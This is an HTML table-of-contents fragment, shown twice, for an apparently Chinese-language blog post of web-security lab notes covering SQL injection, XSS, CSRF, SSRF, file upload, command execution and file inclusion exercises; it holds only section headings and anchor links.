href="#first-2"><span class="toc-text">first</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second-2"><span class="toc-text">second</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2-Less-38"><span class="toc-text">SQL注入类型——堆叠查询(Less-38)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-38"><span class="toc-text">Less-38</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-Less-32"><span class="toc-text">SQL注入类型——宽字节注入(Less-32)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-32"><span class="toc-text">Less-32</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E6%B3%A8%E5%85%A5Less-11"><span class="toc-text">post注入Less-11</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3"><span class="toc-text">sqli-labs工具破解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89"><span class="toc-text">跨站脚本攻击（XSS）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-text">类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">反射型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA"><span class="toc-text">DVWA靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-text">存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">DVWA靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%B6%E7%94%B3"><span class="toc-text">延申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-text">DOM型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA"><span class="toc-text">pikachu靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">三种类型之间的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-labs-master%E9%9D%B6%E5%9C%BA"><span class="toc-text">xss-labs-master靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%94%A8htmlspecialchars-%E5%87%BD%E6%95%B0%E5%AF%B9keyword%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86"><span class="toc-text">服务器端用htmlspecialchars()函数对keyword参数的值进行处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level3"><span class="toc-text">level3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4"><span class="toc-text">level4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5"><span class="toc-text">level5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level7"><span class="toc-text">level7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level8"><span class="toc-text">level8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level9"><span class="toc-text">level9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level10"><span class="toc-text">level10</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA-2"><span class="toc-text">DVWA靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">pikachu靶场</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-labs"><span class="toc-text">upload-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-01"><span class="toc-text">Pass-01</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E7%A6%81%E7%94%A8js"><span class="toc-text">方法一 禁用js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E6%8A%93%E5%8C%85"><span class="toc-text">方法二 抓包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-02"><span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-03"><span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E7%94%B3-1"><span class="toc-text">延申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行&#x2F;代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Airflow-CVE-2020-11978"><span class="toc-text">Apache Airflow(CVE-2020-11978)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8vulhub%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">启动vulhub靶场环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">NC反弹shell</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%EF%BC%88SQL-Injection%EF%BC%89"><span class="toc-text">SQL注入（SQL Injection）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89%EF%BC%88%E8%BF%87%E7%A8%8B%EF%BC%89"><span class="toc-text">定义（过程）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E5%8E%9F%E5%9B%A0"><span class="toc-text">形成原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%87%E7%A8%8B"><span class="toc-text">常见过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-injection%E5%8F%82%E6%95%B0"><span class="toc-text">SQL injection参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">在渗透测试过程中的作用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E7%8E%B0%E4%BD%8D%E7%BD%AE"><span class="toc-text">出现位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BB%E6%89%BE%E6%96%B9%E5%BC%8F"><span class="toc-text">SQL注入漏洞寻找方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD%E4%BE%9D%E6%8D%AE"><span class="toc-text">SQL注入漏洞判断依据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81SQL%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5"><span class="toc-text">常见SQL测试语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E5%AD%97%E7%AC%A6"><span class="toc-text">注释字符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E8%BF%87%E7%A8%8B"><span class="toc-text">实操过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-text">sqli-labs手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%88Less-1%EF%BC%8C2%EF%BC%8C3%EF%BC%8C4%EF%BC%89"><span class="toc-text">SQL注入类型——联合查询（Less-1，2，3，4）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-1"><span class="toc-text">Less-1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first"><span class="toc-text">first</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second"><span class="toc-text">second</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#third"><span class="toc-text">third</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#forth"><span class="toc-text">forth</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-2"><span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-3"><span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0"><span class="toc-text">sql注入练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%88Less-5%EF%BC%8C6%EF%BC%89"><span class="toc-text">SQL注入类型——报错注入（Less-5，6）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-5"><span class="toc-text">Less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first-1"><span class="toc-text">first</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second-1"><span class="toc-text">second</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-Less-8"><span class="toc-text">SQL注入类型——布尔盲注(Less-8)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-8"><span class="toc-text">Less-8</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first-%E6%B1%82%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6"><span class="toc-text">first 求闭合字符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second-%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6length"><span class="toc-text">second 求数据库名长度length()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#third-%E6%B1%82%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%9A%84ascii%E5%80%BC-substr"><span class="toc-text">third 求数据库名的ascii值 substr</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#forth-%E6%B1%82%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8Fcount"><span class="toc-text">forth 求表的数量count()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fifth-%E6%B1%82%E8%A1%A8%E7%9A%84%E9%95%BF%E5%BA%A6"><span class="toc-text">fifth 求表的长度</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-Less-9"><span class="toc-text">SQL注入类型——时间盲注(Less-9)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-9"><span class="toc-text">Less-9</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#first-2"><span class="toc-text">first</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#second-2"><span class="toc-text">second</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2-Less-38"><span class="toc-text">SQL注入类型——堆叠查询(Less-38)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-38"><span class="toc-text">Less-38</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E2%80%94%E2%80%94%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-Less-32"><span class="toc-text">SQL注入类型——宽字节注入(Less-32)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Less-32"><span class="toc-text">Less-32</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post%E6%B3%A8%E5%85%A5Less-11"><span class="toc-text">post注入Less-11</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3"><span class="toc-text">sqli-labs工具破解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89"><span class="toc-text">跨站脚本攻击（XSS）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B"><span class="toc-text">类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-text">反射型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA"><span class="toc-text">DVWA靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-text">存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">DVWA靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%B6%E7%94%B3"><span class="toc-text">延申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8B"><span class="toc-text">DOM型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA"><span class="toc-text">pikachu靶场</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">三种类型之间的区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-labs-master%E9%9D%B6%E5%9C%BA"><span class="toc-text">xss-labs-master靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level1"><span class="toc-text">level1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level2"><span class="toc-text">level2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%94%A8htmlspecialchars-%E5%87%BD%E6%95%B0%E5%AF%B9keyword%E5%8F%82%E6%95%B0%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86"><span class="toc-text">服务器端用htmlspecialchars()函数对keyword参数的值进行处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#level3"><span class="toc-text">level3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level4"><span class="toc-text">level4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level5"><span class="toc-text">level5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level7"><span class="toc-text">level7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level8"><span class="toc-text">level8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level9"><span class="toc-text">level9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level10"><span class="toc-text">level10</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">CSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA-2"><span class="toc-text">DVWA靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pikachu%E9%9D%B6%E5%9C%BA-1"><span class="toc-text">pikachu靶场</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#upload-labs"><span class="toc-text">upload-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-01"><span class="toc-text">Pass-01</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E7%A6%81%E7%94%A8js"><span class="toc-text">方法一 禁用js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E6%8A%93%E5%8C%85"><span class="toc-text">方法二 抓包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-02"><span class="toc-text">Pass-02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-03"><span class="toc-text">Pass-03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E7%94%B3-1"><span class="toc-text">延申</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行&#x2F;代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Airflow-CVE-2020-11978"><span class="toc-text">Apache Airflow(CVE-2020-11978)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8vulhub%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-text">启动vulhub靶场环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">NC反弹shell</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA"><span class="toc-text">DVWA</span></a></li></ol></li></ol>
     </div>
   </div>
 
